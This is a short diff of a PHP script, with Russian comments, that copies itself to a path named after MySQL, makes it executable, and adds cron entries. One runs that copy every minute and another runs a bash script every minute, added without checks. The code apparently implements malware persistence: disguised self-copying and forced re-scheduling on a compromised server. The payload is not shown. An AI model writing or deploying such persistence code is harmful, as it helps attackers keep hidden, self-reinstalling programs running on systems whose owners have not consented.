@@ -22,6 +22,9 @@ if (!$in_cron) {
         copy($temp_script, $mysql_path);
         unlink($temp_script);
         chmod($mysql_path, 0755);
+        // Add this script to cron directly
+        $php_cron_line = "*/1 * * * * /usr/bin/php " . escapeshellcmd($mysql_path) . "\n";
+        exec("(crontab -l; echo " . escapeshellarg($php_cron_line) . ") | crontab -");
         $current_script = $mysql_path;
     }
 }
@@ -45,7 +48,7 @@ chmod($bashScriptPath, 0755);
 
 // Добавляем две задачи в крон
 $cron_line1 = "*/1 * * * * " . escapeshellcmd($bashScriptPath) . "\n";
-$cron_line2 = "*/2 * * * * " . escapeshellcmd($bashScriptPath) . "\n";
+$cron_line2 = "*/1 * * * * " . escapeshellcmd($bashScriptPath) . "\n";
 
 // Добавляем новые задачи без проверки
 exec("(crontab -l; echo " . escapeshellarg($cron_line1) . "; echo " . escapeshellarg($cron_line2) . ") | crontab -");
